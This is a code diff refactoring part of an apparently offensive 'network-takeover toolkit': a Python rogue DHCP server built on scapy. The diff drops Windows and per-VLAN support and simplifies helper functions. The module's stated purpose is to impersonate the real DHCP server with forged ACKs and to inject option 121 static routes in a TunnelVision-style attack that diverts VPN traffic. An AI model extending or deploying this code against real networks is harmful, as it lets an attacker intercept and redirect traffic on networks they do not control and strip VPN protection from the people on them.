@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
-# v3.0
+# v3.1
 """
 dhcp_takeover.py — DHCP engine for the network-takeover toolkit.
 
 A library module (no orchestration of its own — see main.py).  Provides:
 
-  Network setup (OSPF-derived, no trunking):
+  Network setup (OSPF-derived):
     pick_client_ip          Choose our IP from the OSPF-learned subnet.
     send_dhcpdiscover       Single untagged DHCPDISCOVER to find the real server.
     sniff_dhcpoffer         Capture the resulting DHCPOFFER (server IP + DNS).
@@ -13,7 +13,7 @@ A library module (no orchestration of its own — see main.py).  Provides:
                             rogue DHCP server consumes, populated with OSPF and
                             offer data.
 
-  Rogue DHCP server (unchanged — still needed for option 121 injection):
+  Rogue DHCP server:
     A full OFFER / ACK / NAK / RELEASE server with:
       * option 121 classless static routes (TunnelVision / VPN relay)
       * impersonation of the real server when a client picks it (forged ACKs)
@@ -34,7 +34,6 @@ from scapy.all import (
     Ether,
     IP,
     UDP,
-    get_if_addr,
     get_if_hwaddr,
     mac2str,
     sendp,
@@ -120,17 +119,6 @@ def get_dhcp_options(packet):
     return options
 
 
-def get_dhcp_message_type(packet):
-    return next(
-        (
-            option_value
-            for option_name, option_value in iter_dhcp_options(packet)
-            if option_name == "message-type"
-        ),
-        None,
-    )
-
-
 def get_dhcp_option(packet, option_name):
     return next(
         (
@@ -170,11 +158,11 @@ def get_requested_or_client_address(packet):
 
 
 def is_dhcp_discover(packet):
-    return get_dhcp_message_type(packet) in DHCP_DISCOVER_TYPES
+    return get_dhcp_option(packet, "message-type") in DHCP_DISCOVER_TYPES
 
 
 def is_dhcp_request(packet):
-    return get_dhcp_message_type(packet) in DHCP_REQUEST_TYPES
+    return get_dhcp_option(packet, "message-type") in DHCP_REQUEST_TYPES
 
 
 def get_offer_details(packet):
@@ -266,7 +254,7 @@ def sniff_dhcpoffer(interface, timeout=10):
     def _handle(pkt):
         if not (pkt.haslayer(BOOTP) and pkt.haslayer(DHCP)):
             return
-        if get_dhcp_message_type(pkt) not in DHCP_OFFER_TYPES:
+        if get_dhcp_option(pkt, "message-type") not in DHCP_OFFER_TYPES:
             return
         result.append(get_offer_details(pkt))
         return True  # stop_filter
@@ -322,7 +310,6 @@ def build_server_details_from_ospf(interface, ospf_params, source_ip,
         "netmask":     netmask,
         "dns":         resolved_dns,
         "network":     network,
-        "vlan_details": {},
         "relay_only":  False,
         "answered_request_xids": set(),
         "opt121_subnets":           list(HIJACK_ROUTE_PREFIXES),
@@ -332,48 +319,22 @@ def build_server_details_from_ospf(interface, ospf_params, source_ip,
 
 
 
-def set_static_address_windows(interface, address, netmask, gateway=None):
-    print_step("START", f"Preparing Windows static address setup for {interface}")
-    run_command(
-        f"Releasing DHCP lease on Windows interface {interface}",
-        ["ipconfig", "/release", interface],
-    )
-    command = [
-        "netsh", "interface", "ipv4", "set", "address",
-        f"name={interface}",
-        "source=static",
-        f"address={address}",
-        f"mask={netmask}",
-    ]
-    run_command(
-        f"Setting Windows static IP {address}/{netmask} on {interface}",
-        command,
-    )
-    print_step("OK", f"Completed Windows static address setup for {interface}")
-
-
 def get_interface_ipv4_addresses(interface, scope="global"):
-    if platform.system().lower() == "linux" and shutil.which("ip"):
-        command = ["ip", "-4", "-o", "addr", "show", "dev", interface]
-        if scope:
-            command.extend(["scope", scope])
-        result = subprocess.run(command, capture_output=True, text=True, check=False)
-        if result.returncode == 0:
-            addresses = []
-            for line in result.stdout.splitlines():
-                parts = line.split()
-                if "inet" in parts:
-                    inet_index = parts.index("inet")
-                    if inet_index + 1 < len(parts):
-                        addresses.append(parts[inet_index + 1])
-            return addresses
-    try:
-        address = get_if_addr(interface)
-    except Exception:
+    command = ["ip", "-4", "-o", "addr", "show", "dev", interface]
+    if scope:
+        command.extend(["scope", scope])
+    result = subprocess.run(command, capture_output=True, text=True, check=False)
+    if result.returncode != 0:
+        print_step("WARN", f"ip addr show failed for {interface}: {result.stderr.strip()}")
         return []
-    if address and address != "0.0.0.0":
-        return [address]
-    return []
+    addresses = []
+    for line in result.stdout.splitlines():
+        parts = line.split()
+        if "inet" in parts:
+            inet_index = parts.index("inet")
+            if inet_index + 1 < len(parts):
+                addresses.append(parts[inet_index + 1])
+    return addresses
 
 
 def wait_for_interface_ipv4_address(interface, expected_address=None, timeout=INTERFACE_IPV4_WAIT_TIMEOUT):
@@ -456,16 +417,7 @@ def set_static_address_kali(interface, address, netmask, gateway=None):
 
 
 def set_static_address(interface, address, netmask, gateway=None):
-    system = platform.system().lower()
-    print_step("START", f"Detected operating system: {system}")
-    if system == "windows":
-        set_static_address_windows(interface, address, netmask, gateway)
-    elif system == "linux":
-        set_static_address_kali(interface, address, netmask, gateway)
-    else:
-        print_step("FAIL", f"Unsupported operating system: {platform.system()}")
-        raise OSError(f"Unsupported operating system for static address setup: {platform.system()}")
-    print_step("OK", f"Static address setup finished on {interface}")
+    set_static_address_kali(interface, address, netmask, gateway)
 
 
 
@@ -516,18 +468,7 @@ def get_packet_vlan_id(packet):
     return None
 
 
-def get_learned_vlan_details(packet, server_details):
-    vlan_id = get_packet_vlan_id(packet)
-    if vlan_id is None:
-        return None
-    return server_details.get("vlan_details", {}).get(vlan_id)
-
-
-def get_direct_client_network(packet, server_details):
-    # Per-VLAN detail overrides (populated from DHCPOFFER sniffing, now always empty).
-    vlan_details = get_learned_vlan_details(packet, server_details)
-    if vlan_details:
-        return vlan_details["network"]
+def get_direct_client_network(server_details):
     # Always use the OSPF-derived server subnet as the authoritative pool.
     # Never derive the pool from the client's preferred IP — a stale lease from
     # a different VLAN would silently move the pool to the wrong subnet, causing
@@ -535,17 +476,11 @@ def get_direct_client_network(packet, server_details):
     return server_details["network"]
 
 
-def get_direct_client_subnet_mask(packet, network, server_details):
-    vlan_details = get_learned_vlan_details(packet, server_details)
-    if vlan_details:
-        return vlan_details["subnet_mask"]
+def get_direct_client_subnet_mask(network):
     return str(network.netmask)
 
 
-def get_direct_client_router(packet, network, server_details):
-    vlan_details = get_learned_vlan_details(packet, server_details)
-    if vlan_details and vlan_details.get("router"):
-        return vlan_details["router"]
+def get_direct_client_router(network, server_details):
     return get_default_router_for_network(network, server_details.get("gateway"))
 
 
@@ -583,10 +518,10 @@ def get_or_add_dhcp_network(packet, networks, server_details):
     vlan_id = get_packet_vlan_id(packet)
 
     if giaddr == "0.0.0.0":
-        network = get_direct_client_network(packet, server_details)
-        subnet_mask = get_direct_client_subnet_mask(packet, network, server_details)
+        network = get_direct_client_network(server_details)
+        subnet_mask = get_direct_client_subnet_mask(network)
         network_key = ("direct", str(network))
-        router = get_direct_client_router(packet, network, server_details)
+        router = get_direct_client_router(network, server_details)
         excluded_addresses = {server_details["source_ip"]}
         if router:
             excluded_addresses.add(router)
@@ -687,13 +622,8 @@ def lease_next_available_address(dhcp_network, requested_address=None):
     return None
 
 
-def get_dns_for_response(dhcp_network, server_details):
-    """Resolve DNS to use in a response: per-VLAN learned > server-level learned > None."""
-    vlan_id = dhcp_network.get("vlan_id")
-    if vlan_id is not None:
-        vlan_dns = server_details.get("vlan_details", {}).get(vlan_id, {}).get("dns")
-        if vlan_dns:
-            return vlan_dns
+def get_dns_for_response(server_details):
+    """Return the DNS server to advertise, mirrored from the real server's offer."""
     return server_details.get("dns")
 
 
@@ -758,7 +688,7 @@ def build_dhcp_response(packet, message_type, offered_ip, dhcp_network, server_i
 
     # DNS: mirror the legitimate server's DNS so clients get working resolution.
     if server_details is not None:
-        dns = get_dns_for_response(dhcp_network, server_details)
+        dns = get_dns_for_response(server_details)
         if dns:
             dhcp_options.append(("name_server", dns))
 
@@ -1020,7 +950,7 @@ def handle_dhcp_release(packet, networks, server_details):
 
 def handle_dhcp_client_packet(packet, networks, proposed_leases, server_details):
     """Dispatch DHCPDISCOVER, DHCPREQUEST, DHCPRELEASE, and DHCPNAK; return a result dict or None."""
-    message_type = get_dhcp_message_type(packet)
+    message_type = get_dhcp_option(packet, "message-type")
     if (
         server_details.get("relay_only")
         and packet[BOOTP].giaddr == "0.0.0.0"
